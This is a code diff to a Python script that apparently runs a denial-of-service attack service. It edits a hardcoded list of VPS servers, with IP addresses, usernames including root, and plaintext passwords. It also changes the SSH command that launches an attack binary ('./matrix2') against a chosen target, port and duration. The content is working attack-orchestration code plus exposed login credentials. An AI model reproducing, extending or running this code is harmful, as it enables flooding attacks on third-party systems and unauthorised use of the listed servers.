@@ -1017,11 +1017,11 @@ from collections import deque
 # Modified VPS configuration with tracking
 vps_list = [
     {
-        "host": "4.247.23.89",
-        "username": "userpktd",
-        "password": "user@pktd123",
+        "host": "139.59.224.126",
+        "username": "root",
+        "password": "123Buyer",
         "active_attacks": 0,
-        "max_attacks": 3,
+        "max_attacks": 1,
         "ongoing_attacks": [],
         "attack_start_time": None,
         "attack_duration": 0
@@ -1080,7 +1080,7 @@ def execute_attack_on_vps(vps, target, port, time):
             auth_timeout=20
         )
 
-        command = f"./matrixee {target} {port} {time} 1"
+        command = f"./matrix2 {target} {port} {time} 8 800"
         channel = ssh.get_transport().open_session()
         channel.exec_command(command)
         
